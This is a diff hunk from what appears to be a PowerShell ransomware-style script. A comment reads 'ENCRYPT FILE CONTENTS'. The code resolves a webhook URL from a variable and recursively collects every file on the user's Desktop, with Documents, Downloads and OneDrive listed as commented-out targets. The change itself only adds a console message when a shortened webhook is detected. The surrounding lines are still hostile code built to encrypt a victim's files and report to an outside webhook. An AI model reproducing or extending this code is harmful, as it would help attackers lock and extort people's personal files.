@@ -40,7 +40,7 @@ add-type -name win -member $Import -namespace native;
 # ENCRYPT FILE CONTENTS
 # Define setup variables
 $whuri = "$dc"
-if ($whuri.Ln -ne 121){$whuri = (irm $whuri).url}
+if ($whuri.Ln -ne 121){Write-host "Shortened Webhook URL Detected"; $whuri = (irm $whuri).url}
 $SourceFolder = "$env:USERPROFILE\Desktop" #,"$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
 $files = Get-ChildItem -Path $SourceFolder -File -Recurse
 
